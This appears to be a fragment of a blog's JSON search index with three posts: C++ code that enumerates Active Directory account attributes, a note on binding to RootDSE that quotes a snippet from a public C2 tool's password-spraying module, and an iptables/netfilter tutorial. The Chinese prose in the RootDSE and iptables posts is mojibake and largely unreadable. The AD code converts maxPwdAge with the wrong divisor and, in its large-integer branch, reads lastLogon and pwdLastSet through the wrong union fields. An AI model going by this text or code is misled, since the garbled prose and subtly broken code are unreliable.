L&quot;maxPwdAge&quot;) == 0) &#123; CStringW strTime; DWORD Days = col.pADsValues-&gt;LargeInteger.QuadPart / 1000 / 1000 / 1000 / 60 / 60 / 24; strTime.Format(L&quot;%d day(s)&quot;, Days); uAccount.strPwdExpireTime = strTime; &#125; else if (_wcsicmp(col.pszAttrName, L&quot;lastLogonTimestamp&quot;) == 0) &#123; ADS_LARGE_INTEGER strValue = col.pADsValues-&gt;LargeInteger; uAccount.tmLastLogon = strValue.QuadPart; &#125; &#125; else if (col.dwADsType == ADSTYPE_LARGE_INTEGER) &#123; for (x = 0; x &lt; col.dwNumValues; x++) &#123; if (_wcsicmp(col.pszAttrName, L&quot;lastLogon&quot;) == 0) &#123; ADS_UTC_TIME tm = col.pADsValues-&gt;UTCTime; SYSTEMTIME monTS; if (FileTimeToSystemTime(reinterpret_cast&lt;PFILETIME&gt;(&amp;tm), &amp;monTS) != FALSE) &#123; CStringA sTime; sTime.Format(&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond); uAccount.strLastLogon = sTime; &#125; uAccount.tmLastLogon = col.pADsValues-&gt;Timestamp.WholeSeconds; &#125; else if (_wcsicmp(col.pszAttrName, L&quot;pwdLastSet&quot;) == 0) &#123; ADS_UTC_TIME tm = col.pADsValues-&gt;UTCTime; SYSTEMTIME monTS; if (FileTimeToSystemTime(reinterpret_cast&lt;PFILETIME&gt;(&amp;tm), &amp;monTS) != FALSE) &#123; CStringA sTime; sTime.Format(&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;, monTS.wYear, monTS.wMonth, monTS.wDay, monTS.wHour, monTS.wMinute, monTS.wSecond); uAccount.strPwdChangeTime = sTime; &#125; &#125; &#125; &#125; else if (col.dwADsType == ADSTYPE_OCTET_STRING) &#123; for (x = 0; x &lt; col.dwNumValues; x++) &#123; if (_wcsicmp(col.pszAttrName, L&quot;objectSid&quot;) == 0) &#123; PSID pObjectSID = NULL; LPWSTR lpSID = NULL; pObjectSID = (PSID)(col.pADsValues[x].OctetString.lpValue); // Convert SID to string. ConvertSidToStringSidW(pObjectSID, &amp;lpSID); uAccount.strSID = lpSID; if (lpSID) &#123; LocalFree(lpSID); &#125; &#125; &#125; &#125; else if (col.dwADsType == ADSTYPE_BOOLEAN) &#123; for (x = 0; x &lt; col.dwNumValues; x++) &#123; if (_wcsicmp(col.pszAttrName, L&quot;isCriticalSystemObject&quot;) == 0) &#123; uAccount.bAdmin = col.pADsValues-&gt;Boolean; &#125; &#125; &#125;&#125;","tags":[{"name":"Windows/AD","slug":"Windows-AD","permalink":"https://hodlyounger.github.io/tags/Windows-AD/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/AD/"}]},{"title":"ã€ADã€‘RootDSE","date":"2024-01-19T02:40:59.588Z","path":"A_OS/Windows/AD/ã€ADã€‘RootDSE/","text":"æ¦‚è¿°ï¼šRootDSE å±æ€§æè¿°åŠä½¿ç”¨ å‚è€ƒé“¾æ¥ï¼š RootDSE (AD æ¶æ„) - Win32 apps | Microsoft Learn 0x01 roorDSE rootDSE æ˜¯æ¯ä¸ªç›®å½•æœåŠ¡å™¨ä¸Šçš„å·²çŸ¥å¯é ä½ç½®ï¼Œç”¨äºè·å–åŸŸã€æ¶æ„å’Œé…ç½®å®¹å™¨çš„å¯åˆ†è¾¨åç§°ï¼Œä»¥åŠæœ‰å…³æœåŠ¡å™¨åŠå…¶ç›®å½•æ•°æ®æ ‘å†…å®¹çš„å…¶ä»–æ•°æ®ã€‚ è¿™äº›å±æ€§å¾ˆå°‘åœ¨ç‰¹å®šæœåŠ¡å™¨ä¸Šå‘ç”Ÿæ›´æ”¹ã€‚ åº”ç”¨ç¨‹åºå¯ä»¥åœ¨å¯åŠ¨æ—¶è¯»å–è¿™äº›å±æ€§ï¼Œå¹¶åœ¨æ•´ä¸ªä¼šè¯ä¸­ä½¿ç”¨å®ƒä»¬ã€‚ æ€»ä¹‹ï¼Œåº”ç”¨ç¨‹åºåº”ä½¿ç”¨æ— æœåŠ¡å™¨ç»‘å®šç»‘å®šåˆ°å½“å‰åŸŸä¸Šçš„ç›®å½•ï¼Œä½¿ç”¨ rootDSE è·å–å‘½åç©ºé—´çš„å¯åˆ†è¾¨åç§°ï¼Œå¹¶ä½¿ç”¨è¯¥å¯åˆ†è¾¨åç§°ç»‘å®šåˆ°å‘½åç©ºé—´ä¸­çš„å¯¹è±¡ã€‚ åœ¨ LDAP 3.0 ä¸­ï¼ŒrootDSE å®šä¹‰ä¸ºç›®å½•æœåŠ¡å™¨ä¸Šçš„ç›®å½•æ•°æ®æ ‘çš„æ ¹ã€‚ rootDSE ä¸å±äºä»»ä½•å‘½åç©ºé—´ã€‚ rootDSE çš„ç”¨é€”æ˜¯æä¾›æœ‰å…³ç›®å½•æœåŠ¡å™¨çš„æ•°æ®ã€‚ ä¸‹é¢æ˜¯ç”¨äºç»‘å®šåˆ° rootDSE çš„ç»‘å®šå­—ç¬¦ä¸²ã€‚ 1LDAP://&lt;servername&gt;/rootDSE servername &lt;&gt; æ˜¯æœåŠ¡å™¨çš„ DNS åç§°ã€‚ servername &lt;&gt; æ˜¯å¯é€‰çš„ï¼Œå¦‚ä»¥ä¸‹æ ¼å¼æ‰€ç¤ºã€‚ 1LDAP://rootDSE 0x02 rootDSEçš„ä½¿ç”¨ å‚è€ƒä»£ç ï¼šC2-Tool-Collection/BOF/SprayAD/SOURCE/SprayAD.c at e371a38c717edaf1650923575ab33bee0dd3e0ee Â· outflanknl/C2-Tool-Collection 12345678910hr = ADsOpenObject(L&quot;LDAP://rootDSE&quot;, NULL, NULL, ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption IADsIID, (void**)&amp;pRoot); if (FAILED(hr)) &#123; Debug_ErrorStr(L&quot;Failed to get rootDSE.\\n&quot;); goto CleanUp; &#125;","tags":[{"name":"Windows/AD","slug":"Windows-AD","permalink":"https://hodlyounger.github.io/tags/Windows-AD/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/AD/"}]},{"title":"ã€Linuxé˜²ç«å¢™ã€‘iptables","date":"2024-01-16T06:22:10.861Z","path":"A_OS/Linux/Linuxé˜²ç«å¢™/iptables/","text":"æ¦‚è¿°ï¼šéšç€ç½‘ç»œçš„é€æ¸æ™®åŠï¼Œäººä»¬å¯¹å…¶çš„éœ€æ±‚è¶Šæ¥è¶Šå¼ºï¼Œå„ç§æœåŠ¡ï¼Œå¹³å°åº”è¿è€Œç”Ÿï¼Œè€Œå¹³å°ä¸æœåŠ¡åœ¨å…¬ç½‘çš„æš´éœ²ä¹Ÿå¢åŠ äº†å—æ”»å‡»çš„é£é™©ï¼Œè€Œ Linux ä¸­çš„æœ€é‡è¦çš„å®ˆæŠ¤ç¥ iptables çš„åœ°ä½ä¹Ÿæ˜¾å¾—è¶Šæ¥è¶Šé‡è¦ã€‚æœ¬å®éªŒå°†å¸¦å¤§å®¶åˆè¯† iptablesã€‚å½“ç„¶å­¦ä¹ æœ¬å®éªŒä¹‹å‰æœ‰ä¸€å®šçš„ç½‘ç»œåŸºç¡€çŸ¥è¯†èƒ½å¤Ÿå¸®åŠ©ç†è§£ã€‚ å®éªŒæ¶‰åŠçš„çŸ¥è¯†ç‚¹ iptables çš„å‘å±• iptables çš„ç»“æ„ iptables çš„ä½¿ç”¨ 0x01 iptables çš„å‘å±• ä¸Šä¸ªå®éªŒä¸­æˆ‘ä»¬äº†è§£åˆ°ï¼Œé˜²ç«å¢™ä¹Ÿå°±æ˜¯å·¥ä½œåœ¨ä¸»æœºæˆ–è€…ç½‘ç»œè¾¹ç¼˜ï¼Œå¯¹è¿›å‡ºçš„æŠ¥æ–‡æŒ‰äº‹å…ˆè®¾å®šçš„è§„åˆ™è¿›è¡Œæ£€æŸ¥ï¼Œå¹¶å¯¹åŒ¹é…çš„æ•°æ®åŒ…åšå‡ºå¤„ç†çš„ä¸€ç»„ç¡¬ä»¶æˆ–è€…æ˜¯è½¯ä»¶ï¼Œè®¾ç½®è½¯ç¡¬ä»¶çš„ç»“åˆä½“ã€‚ è€Œåœ¨ Linux çš„ä¸­çš„é˜²ç«å¢™å½“ç„¶ä¹Ÿå°±æ˜¯é‚£ä¹ˆä¸€ç»„è½¯ä»¶å¯¹æ•°æ®åŒ…çš„å¤„ç†ï¼ŒLinux ä¸­çš„é˜²ç«å¢™ä¸»è¦æ˜¯è¿›è¡Œä¸€äº›åŒ…çš„è¿‡æ»¤ï¼Œè€Œè¿™å¥—é˜²ç«å¢™ä¹Ÿä¸æ˜¯ä¸€å¼€å§‹ä¾¿å¦‚æ­¤çš„å¼ºå¤§ï¼Œæ˜¯è¿™æ ·çš„ä¸€ä¸ªå‘å±•è¿‡ç¨‹ï¼š Linuxå†…æ ¸2.0ï¼š ipfwadm Linuxå†…æ ¸2.2ï¼š ipchains Linuxå†…æ ¸2.4ï¼š iptables è€Œä¸ºä»€ä¹ˆéšç€å†…æ ¸ç‰ˆæœ¬çš„å‡çº§ï¼Œæˆ‘ä»¬çš„ä½¿ç”¨çš„é˜²ç«å¢™ä¹Ÿåœ¨ä¸æ–­åœ°å˜åŒ–ï¼Œé¦–å…ˆ ipchains ç›¸è¾ƒäº ipfwadm æœ‰è¿™æ ·ä¸€äº›ä¼˜åŠ¿ï¼š Qosï¼ˆQuality of serviceï¼‰çš„æ”¯æŒ ipchains æ˜¯æ ‘å½¢ç»“æ„çš„é“¾ï¼Œè€Œ ipfwadm æ˜¯çº¿æ€§çš„ç»“æ„ï¼Œæ ‘å½¢ç»“æ„èƒ½å¤Ÿåšåˆ°åœ¨è‡ªå·±æ‹¥æœ‰é“¾çš„æƒ…å†µä¸‹å†å»æ¥å—å…¶ä»–è·³è½¬è¿‡æ¥çš„é“¾ ipchains æ¯” ipfwadm åœ¨é…ç½®ä¸Šæ›´åŠ çš„çµæ´» ipchains å¯ä»¥æ˜ç¡®åœ°è¿‡æ»¤ä»»ä½•çš„ ip åè®®ï¼Œä¸ä»…ä»…æ˜¯ TCPã€UDPã€ICMP è€Œ iptables ä¹‹æ‰€ä»¥èƒ½å¤Ÿæ›¿ä»£ ipchains æ˜¯å› ä¸ºå®ƒå…·æœ‰ä»¥ä¸‹ä¸€äº›ä¼˜åŠ¿ï¼š å¯ä»¥è¿½è¸ªæœ‰çŠ¶æ€çš„ IPV4 çš„åè®®ä¸åº”ç”¨ å¯ä»¥è¿½è¸ªæœ‰çŠ¶æ€çš„ IPV6 çš„åè®® èƒ½å¤Ÿåšåˆ° NAT çš„ ä¸€å¯¹å¤šä¸å¤šå¯¹å¤š å†…å»ºçš„ PORTFW åŠŸèƒ½ è‹¥æƒ³äº†è§£å¾ˆå¤šçš„ä¿¡æ¯å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ° iptables å°±æ˜¯ç›®å‰å·¥ä½œäºè¾ƒæ–°ç‰ˆï¼ˆå†…æ ¸ç‰ˆæœ¬é«˜è¿‡2.4çš„ï¼‰ Linux å†…æ ¸ä¸­çš„å¼ºå¤§çš„æ•°æ®åŒ…è¿‡æ»¤çš„è½¯ä»¶ï¼Œå®ƒä¸»è¦æ˜¯ç”±ä¸¤éƒ¨åˆ†ç»„æˆ iptalbesï¼šä¸»è¦å·¥ä½œäºç”¨æˆ·ç©ºé—´ï¼Œä¸ºç”¨æˆ·æä¾›äº†ä¸€ä¸ªç¼–è¾‘è§„åˆ™çš„æ¥å£ã€‚ netfilterï¼šä¸»è¦å·¥ä½œäºå†…æ ¸ç©ºé—´ï¼Œæ˜¯å†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œç”±ä¸€äº›è¿‡æ»¤è¡¨ç»„æˆã€‚ netfilter å·¥ä½œäºç³»ç»Ÿçš„å†…æ ¸ç©ºé—´ï¼Œæœ€åº•å±‚çš„å·¥ä½œï¼Œæ‰€ä»¥çœŸæ­£ä»¤è¿‡æ»¤è§„åˆ™ç”Ÿæ•ˆçš„å¹¶ä¸æ˜¯ iptables è€Œæ˜¯ netfilterï¼Œè€Œ iptables å·¥ä½œåœ¨ netfilterä¹‹ä¸Šï¼Œæ˜¯ä¸€ä¸ªè®©ç”¨æˆ·ç¼–å†™è§„åˆ™çš„å·¥å…·ã€‚ netfilter/iptables æ˜¯ Rusty Russell åœ¨1998å¹´å°±å¼€å§‹å†™çš„ä¸€ä¸ªé¡¹ç›®ï¼Œnetfilter æ˜¯ Linux å†…æ ¸ä¸­çš„ä¸€ä¸ªæ¡†æ¶ï¼Œå›  Linux æ‹¥æœ‰é«˜æ¨¡å—åŒ–çš„å†…æ ¸ï¼Œæ‰€ä»¥ Linux å¾ˆå¤šåŠŸèƒ½éƒ½ä»¥æ¨¡å—å½¢å¼å­˜åœ¨ï¼Œè€Œæ¨¡å—åŒ–çš„è®¾è®¡æœ€å¤§çš„ä¼˜ç‚¹åœ¨äºâ€œå¼¹æ€§â€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Linuxçš„æ¨¡å—ç®¡ç†å·¥å…·ï¼Œéšå¿ƒæ‰€æ¬²åœ°å°†æ¨¡å—è½½å…¥å†…å­˜ä¸ç§»é™¤å†…å­˜ï¼Œå› æ­¤ Netfilter ä¹Ÿæ˜¯ä»¥æ¨¡å—çš„å½¢å¼å­˜åœ¨äº Linux ä¸­ã€‚ï¼Œé‡‡ç”¨æåº¦æ¨¡å—åŒ–çš„è®¾è®¡ï¼Œä½¿å…¶çš„æ‹¥æœ‰æ›´å¥½çš„æ‰©å……æ€§ä»¥åŠå¾ˆå¼ºçš„çµæ´»æ€§ï¼Œæä¾›ä¸€ç§ç‰¹å®šçš„æ–¹å¼å®ç°å®šåˆ¶çš„æ¨¡å—ï¼Œå…è®¸å„ç§ç½‘ç»œç›¸å…³çš„æ“ä½œã€‚iptables è¿™ä¸ªåº”ç”¨å±‚çš„ç¨‹åºä¾¿æ˜¯è°ƒç”¨å®ƒçš„æ¥å£å®ç°è§„åˆ™çš„ä¿®æ”¹ã€‚ ï¼ˆæ­¤å›¾æ¥æºäºï¼š[ç»´åŸºç™¾ç§‘](https://en.wikipedia.org/wiki/Netfilter)) 0x02 iptables çš„ç»“æ„ Netfilter æ‰€è®¾ç½®çš„è§„åˆ™æ˜¯å­˜æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œ iptables é€šè¿‡ Netfilter æ”¾å‡ºçš„å†…æ ¸æ¥å£ ip_tables æ¥å¯¹å­˜æ”¾åœ¨å†…å­˜ä¸­çš„ Netfilter é…ç½®è¡¨è¿›è¡Œä¿®æ”¹ã€‚è¿™ä¸ªé…ç½®è¡¨ä¸»è¦ç”± tablesã€chainsã€target ç»„æˆã€‚ æ­¤å›¾ç‰‡æ¥æºäºhttp://byrev.space/free/wp-content/uploads/sites/3/iptables-linux.png å…¶ä¸­è¡¨ä¸»è¦æœ‰è¿™å››å¼ ï¼š filterè¡¨ NATè¡¨ mangleè¡¨ rawè¡¨ æ¯ä¸ªè¡¨ä¸­å¯ä»¥ç”¨çš„ chains ä¸å…¨ç›¸åŒï¼Œå½“ç„¶ iptables æ”¯æŒæ–°å»º chainsï¼Œè€Œ chains æ˜¯ Netfilter æ¡†æ¶ä¸­åˆ¶å®šçš„å¯¹æ•°æ®åŒ…çš„ Hook Pointï¼ŒHook Point æ˜¯ä¸€ä¸ªæ•°æ®åŒ…é€šè¿‡ç½‘å¡æµç»ç³»ç»Ÿå†…æ ¸ç›¸åº”çš„ä½ç½®æ—¶ä¼šå¯¹æ•°æ®åŒ…çš„æµå‘åšå‡ºä¸€å®šçš„ä¿®æ”¹ï¼Œåœ¨ç³»ç»Ÿä¸Šå­˜åœ¨5ä¸ª Hook Point çš„æŒ‚è½½ç‚¹ PREROUTING INPUT OUTPUT FORWARD POSTROUTING target ä¸­å¤§éƒ¨åˆ†æ˜¯é€šç”¨çš„ï¼Œå½“ç„¶æœ‰éƒ¨åˆ†æ˜¯ç‰¹å®šä½¿ç”¨çš„ï¼Œè¿™é‡Œåªåˆ—ä¸¾å¸¸ç”¨çš„å‡ ç§è§„åˆ™ï¼Œæ›´å¤šçš„è§„åˆ™å¤§å®¶å¯ä»¥ä½¿ç”¨ man æ¥æŸ¥çœ‹ ACCEPTï¼šä¸€æ—¦åŒ…æ»¡è¶³äº†æŒ‡å®šçš„åŒ¹é…æ¡ä»¶ï¼Œå°±ä¼šé€šè¿‡ï¼Œå¹¶ä¸”ä¸ä¼šå†å»åŒ¹é…å½“å‰é“¾ä¸­çš„å…¶ä»–è§„åˆ™æˆ–åŒä¸€ä¸ªè¡¨å†…çš„å…¶ä»–è§„åˆ™ï¼Œä½†å®ƒè¿˜è¦é€šè¿‡å…¶ä»–è¡¨ä¸­çš„é“¾ DROPï¼šä¸€æ—¦åŒ…æ»¡è¶³äº†æŒ‡å®šçš„åŒ¹é…æ¡ä»¶ï¼Œå°†ä¼šæŠŠè¯¥åŒ…ä¸¢å¼ƒï¼Œä¹Ÿå°±æ˜¯è¯´åŒ…çš„ç”Ÿå‘½åˆ°æ­¤ç»“æŸï¼Œä¸ä¼šå†å‘å‰èµ°ä¸€æ­¥ï¼Œæ•ˆæœå°±æ˜¯åŒ…è¢«é˜»å¡äº†ã€‚ä¸ä¼šè¿”å›ä»»ä½•çš„æ¶ˆæ¯ REJECTå’ŒDROPåŸºæœ¬ä¸€æ ·ï¼Œä¸€æ—¦åŒ…æ»¡è¶³äº†æŒ‡å®šçš„åŒ¹é…æ¡ä»¶ï¼Œå°†ä¼šæŠŠè¯¥åŒ…ä¸¢å¼ƒï¼Œä½†æ˜¯å®ƒé™¤äº†é˜»å¡åŒ…ä¹‹å¤–ï¼Œè¿˜å‘å‘é€è€…è¿”å›é”™è¯¯ä¿¡æ¯ã€‚ SNATï¼šä¸€æ—¦åŒ…æ»¡è¶³äº†æŒ‡å®šçš„åŒ¹é…æ¡ä»¶ï¼Œæºç½‘ç»œåœ°å€è½¬æ¢ DNATï¼šä¸€æ—¦åŒ…æ»¡è¶³äº†æŒ‡å®šçš„åŒ¹é…æ¡ä»¶ï¼Œç›®çš„ç½‘ç»œåœ°å€è½¬æ¢ MASQUERADEå’ŒSNATçš„ä½œç”¨ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå®ƒä¸éœ€è¦æŒ‡å®šâ€“to-source REDIRECTï¼šä¸€æ—¦åŒ…æ»¡è¶³äº†æŒ‡å®šçš„åŒ¹é…æ¡ä»¶ï¼Œè½¬å‘æ•°æ®åŒ…ä¸€å¦ä¸€ä¸ªç«¯å£ RETURNï¼šä¸€æ—¦åŒ…æ»¡è¶³äº†æŒ‡å®šçš„åŒ¹é…æ¡ä»¶ï¼Œä½¿æ•°æ®åŒ…è¿”å›ä¸Šä¸€å±‚ MIRRORï¼šé¢ å€’IPå¤´éƒ¨ä¸­çš„æºç›®åœ°å€ï¼Œç„¶åå†è½¬å‘åŒ… 0x03 filterè¡¨çš„è®¤è¯† å…¶ä¸­ filter è¡¨çš„ä¸»è¦ä½œç”¨å°±æ˜¯å¯¹æ•°æ®åŒ…çš„è¿‡æ»¤ï¼Œè®¿é—®æ§åˆ¶ï¼ˆç›¸ç±»ä¼¼çš„æœ‰æ€ç§‘è‡ªå·±å¼€å‘çš„ ACLï¼‰ã€‚è¯¥è¡¨ä¸‹æœ‰ä¸‰ä¸ªè§„åˆ™é“¾ï¼š INPUT é“¾ï¼šINPUT é’ˆå¯¹é‚£äº›ä»å¤–è¿›å…¥æœ¬åœ°ï¼Œä¹Ÿå°±æ˜¯ç›®çš„åœ°æ˜¯æœ¬åœ°çš„åŒ… FORWARD é“¾ï¼šFORWARD é’ˆå¯¹æ‰€æœ‰ä¸æ˜¯æœ¬åœ°äº§ç”Ÿçš„å¹¶ä¸”ç›®çš„åœ°ä¸æ˜¯æœ¬åœ°(å³æœ¬æœºåªæ˜¯è´Ÿè´£è½¬å‘)çš„åŒ… OUTPUT é“¾ï¼šOUTPUT æ˜¯ç”¨æ¥é’ˆå¯¹æ‰€æœ‰æœ¬åœ°ç”Ÿæˆçš„åŒ… åœ¨å†…æ ¸ä¸­ä½¿ç”¨ iptables_filter è¿™ä¸ªæ¨¡å—ï¼Œåœ¨ä»£ç ä¸­å„æ¨¡å—éƒ½æ˜¯ç›¸å¯¹ç‹¬ç«‹çš„åˆå§‹åŒ–ï¼Œæ­¤æ¨¡å—çš„åˆå§‹åŒ–åœ¨æºç  net/ipv4/netfilter/iptable_filter.c â€“&gt;iptable_filter_init ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ filter çš„åˆå§‹åŒ–å‡½æ•° iptables_filter_init ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ³¨å†Œ Hook point çš„å‡½æ•°æ¥å£ nf_register_hooks ä¸­æ˜¯è¿™æ ·å†™çš„ 1234567891011121314151617181920212223242526static struct nf_hook_ops ipt_ops[] __read_mostly = &#123; #è¿™æ˜¯æ³¨å†Œçš„INPUTçš„é“¾ &#123; .hook = ipt_local_in_hook, .owner = THIS_MODULE, .pf = NFPROTO_IPV4, .hooknum = NF_INET_LOCAL_IN, .priority = NF_IP_PRI_FILTER, &#125;, #è¿™æ˜¯æ³¨å†Œçš„FORWARDçš„é“¾ &#123; .hook = ipt_hook, .owner = THIS_MODULE, .pf = NFPROTO_IPV4, .hooknum = NF_INET_FORWARD, .priority = NF_IP_PRI_FILTER, &#125;, #è¿™é‡Œæ³¨å†Œçš„æ˜¯OUTPUTçš„é“¾ &#123; .hook = ipt_local_out_hook, .owner = THIS_MODULE, .pf = NFPROTO_IPV4, .hooknum = NF_INET_LOCAL_OUT, .priority = NF_IP_PRI_FILTER, &#125;,&#125;; å¹¶ä¸”æœ€ç»ˆçš„è°ƒç”¨çš„ä»£ç ä¸­ä¹Ÿéƒ½è°ƒç”¨åˆ°äº† 1234567/* Returns one of the generic firewall policies, like NF_ACCEPT. */unsigned intipt_do_table(struct sk_buff *skb, unsigned int hook, const struct net_device *in, const struct net_device *out, struct xt_table *table) ç”±æ­¤æˆ‘ä»¬äº†è§£åˆ°åœ¨ filter åˆå§‹åŒ–çš„æ—¶å€™ä¾¿æ˜¯åªæ³¨å†Œäº†ä¸‰ä¸ª Hook pointï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æºç åšè‡ªå·±å®šåˆ¶åŒ–çš„ filterï¼Œè¿™é‡Œä¾¿ä¸å†è¿‡å¤šåœ°æ·±å…¥äº†ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥å» netfilter çš„å®˜ç½‘ä¸‹è½½æºç ç ”ç©¶ç ”ç©¶ 0x04 NATè¡¨çš„è®¤è¯† å…¶ä¸­ NATï¼ˆNetwork Address Translationï¼‰ è¡¨ä¸»è¦ç”¨äºä¿®æ”¹æ•°æ®åŒ…çš„æŠ¥å¤´çš„ IP åœ°å€ã€ç«¯å£å·ç­‰ä¿¡æ¯ã€‚å¯ä»¥å®ç°æ•°æ®åŒ…ä¼ªè£…ã€å¹³è¡¡è´Ÿè½½ã€ç«¯å£è½¬å‘å’Œé€æ˜ä»£ç†ã€‚è¯¥è¡¨åŒ…å«ä¸‰ä¸ªé“¾ï¼š NAT æ˜¯ä¸€ç§æŠŠå†…éƒ¨ç½‘ç»œçš„ ip åœ°å€è½¬æ¢ä¸ºåˆæ³•çš„å…¬ç½‘ ip åœ°å€ï¼Œå½“ç§æœ‰ç½‘ä¸»æœºå’Œå…¬å…±ç½‘ä¸»æœºé€šä¿¡çš„IPåŒ…ç»è¿‡NATç½‘å…³æ—¶ï¼Œå°† IP åŒ…ä¸­çš„æºIPæˆ–ç›®çš„ IP åœ¨ç§æœ‰ IP å’Œ NAT çš„å…¬å…± IP ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚èƒ½å¤Ÿæœ‰æ•ˆçš„è§£å†³å…¬ç½‘åœ°å€ä¸è¶³çš„é—®é¢˜ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šèµ·åˆ°å®‰å…¨çš„ä½œç”¨ PREROUTING é“¾ï¼šä½œç”¨æ˜¯åœ¨åŒ…åˆšåˆšåˆ°è¾¾æœ¬æœºæ—¶ï¼Œè·¯ç”±ä¹‹å‰æ”¹å˜å®ƒçš„ç›®çš„åœ°å€ OUTPUT é“¾ï¼šæ”¹å˜æœ¬åœ°äº§ç”Ÿçš„åŒ…çš„ç›®çš„åœ°å€ POSTROUTING é“¾ï¼šåœ¨åŒ…å°±è¦ç¦»å¼€é˜²ç«å¢™ä¹‹å‰æ”¹å˜å…¶æºåœ°å€ æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ ·ä¸€å¼ å›¾æ¥äº†è§£åˆ° Header ä¸­çš„ä¿¡æ¯ä»€ä¹ˆæ ·çš„ï¼ŒNAT å…·ä½“ä¿®æ”¹çš„å†…å®¹ NAT åˆ†ä¸ºä¸‰ç§ç±»å‹ é™æ€ NATï¼ˆstatic NATï¼‰ï¼šip åœ°å€åœ¨è½¬æ¢æ—¶æ˜¯ä¸€ç§ä¸€å¯¹ä¸€çš„å…³ç³» åŠ¨æ€ NATï¼ˆdynamic NAT æˆ–è€…å« pooled NATï¼‰ï¼š ip åœ°å€åœ¨è½¬æ¢æ—¶æ˜¯ä¸€ç§å¤šå¯¹å¤šçš„å…³ç³» NPATï¼ˆNetwork Address Port Translationï¼‰ï¼šç½‘ç»œåœ°å€ç«¯å£è½¬æ¢åœ¨ ip åœ°å€çš„å±‚é¢ä¸Šæ¥è¯´æ˜¯å±äºä¸€ç§å¤šå¯¹ä¸€çš„å…³ç³» NPATæ˜¯æŠŠå†…éƒ¨åœ°å€æ˜ å°„åˆ°å¤–éƒ¨ç½‘ç»œçš„ä¸€ä¸ªIPåœ°å€çš„ä¸åŒç«¯å£ä¸Šï¼Œï¼Œä½†æ˜¯è¿™é‡Œè™½ç„¶æ˜¯å°†å¤šä¸ªå†…ç½‘ ip åœ°å€è½¬æ¢ä¸ºä¸€ä¸ªå…¬ç½‘åœ°å€ï¼Œä½†æ˜¯è¿™é‡Œçš„åœ°å€æ˜¯å…¬ç½‘åœ°å€+ç«¯å£å·çš„å½¢å¼ï¼Œè€Œä¸æ˜¯ç®€å•çš„ä¸€ä¸ªå…¬ç½‘åœ°å€ã€‚ åœ¨ iptables ä¸­æˆ‘ä»¬æ¯”è¾ƒå¸¸ç”¨ NPAT çš„å½¢å¼ï¼Œè€Œ NPAT åˆç»†åˆ†ä¸ºä»¥ä¸‹çš„ä¸¤ç§ï¼š æº NATï¼ˆSNATï¼ŒSource NATï¼‰ä¿®æ”¹æ•°æ®åŒ…çš„æºåœ°å€ã€‚æºNATæ”¹å˜æ•°æ®æµçš„ç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„æ¥æºåœ°å€ï¼Œæ•°æ®åŒ…ä¼ªè£…å°±æ˜¯ä¸€å…·SNATçš„ä¾‹å­ã€‚ ç›®çš„ NATï¼ˆDNATï¼ŒDestination NATï¼‰ä¿®æ”¹æ•°æ®åŒ…çš„ç›®çš„åœ°å€ã€‚å®ƒæ˜¯æ”¹å˜ç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„ç›®çš„åœ°åœ°å€ï¼Œå¦‚å¹³è¡¡è´Ÿè½½ã€ç«¯å£è½¬å‘å’Œé€æ˜ä»£ç†å°±æ˜¯å±äº DNATã€‚ è‹¥æ˜¯è¦åš SNAT çš„æ•°æ®åŒ…éœ€è¦æ·»åŠ åˆ° POSTROUTING é“¾ä¸­ã€‚è¦åš DNAT çš„æ•°æ®åŒ…éœ€è¦æ·»åŠ åˆ° PREROUTING é“¾ä¸­ã€‚ç›´æ¥ä»æœ¬åœ°å‡ºç«™çš„ä¿¡æ¯åŒ…çš„è§„åˆ™è¢«æ·»åŠ åˆ° OUTPUT é“¾ä¸­ã€‚ å› ä¸º SNAT æ˜¯ä¿®æ”¹çš„æºåœ°å€ï¼Œç„¶åé€šè¿‡å‘é€å‡ºå»ï¼Œç»™å…¶ä»–çš„ç½‘ç»œè®¾å¤‡è§£è¯»ï¼Œæ‰€ä»¥å¿…é¡»åœ¨å‘é€å‡ºå»ä¹‹å‰è¿›è¡Œ SNATã€‚æ‰€ä»¥æ•°æ®åŒ…æ˜¯é€å¾€ POSTROUTING é“¾ï¼Œå¹¶ä¸”åŒ¹é…äº†è§„åˆ™ï¼Œåˆ™æ‰§è¡Œ DNAT æˆ– REDIRECT ç›®æ ‡ã€‚ä¾¿å¯åœ¨è·¯ç”±ä¹‹åä¿®æ”¹æºåœ°å€äº†ã€‚ å› ä¸º DNAT æ˜¯ä¿®æ”¹çš„ç›®çš„åœ°å€ï¼Œç„¶åé€šè¿‡è·¯ç”±è½¬å‘å‡ºå»ï¼Œä¸ºäº†ä½¿æ•°æ®åŒ…å¾—åˆ°æ­£ç¡®è·¯ç”±ï¼Œå¿…é¡»åœ¨è·¯ç”±ä¹‹å‰è¿›è¡Œ DNATã€‚æ‰€ä»¥æ•°æ®åŒ…æ˜¯é€å¾€ PREROUTING 